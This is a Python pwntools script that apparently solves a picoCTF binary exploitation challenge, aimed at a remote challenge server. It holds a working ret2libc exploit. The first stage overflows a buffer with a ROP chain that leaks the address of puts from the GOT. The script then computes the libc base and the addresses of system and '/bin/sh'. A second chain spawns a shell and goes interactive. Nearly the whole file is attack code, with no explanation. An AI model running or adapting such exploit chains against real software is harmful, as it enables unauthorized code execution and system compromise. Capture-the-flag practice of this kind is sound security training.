from pwn import *
elf = ELF('/home/kali/Downloads/vuln')
#p = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "/home/kali/Downloads/vuln"])
p=remote('mercury.picoctf.net', 23584)

context.arch = 'amd64'

pop_rdi = p64(0x400913)

do_stuff = p64(0x4006F9)

main=p64(0x400771)

ret = p64(0x040052e)

p.recvuntil(b'!\n')




#p.sendline(elf.got['puts'])

p.sendline(b'A'*128 +  b'\x90'*8 + pop_rdi + p64(elf.got['puts']) +  p64(elf.plt['puts']) + main)



string = p.recvline()
print(f"first recieved line : {string}")


#leaked = p.recvline().strip().rjust(6, b"\x00").ljust(8, b"\x00")


libc = ELF('./libc.so.6')
print("puts offset:", hex(libc.symbols['puts']))
print("system offset:", hex(libc.symbols['system']))
print("/bin/sh offset:", hex(next(libc.search(b'/bin/sh'))))

print('\n')

#leaked = p.recvline().strip().ljust(8, b"\x00")
#leaked_puts = u64(leaked)

leaked = p.recvline().strip()
leaked_puts = u64(leaked.ljust(8, b"\x00"))


print(f"leak: {hex(leaked_puts)}")

libc = leaked_puts -0x80a30

print(f"libc: {hex(libc)}")

binsh = libc + 0x1B40FA

print(f"binsh: {hex(binsh)}")

system = libc +0x4f4e0

print(f"system: {hex(system)}")

setresgid = libc + 0xE5D90

string = p.recvline()
print(string)

#padding to rbp, 8 bytes rbp, then rip

p.sendline(b'\x90'*128 +  b'\x90'*8 + pop_rdi  + p64(binsh)+  ret  + p64(system))

p.interactive()
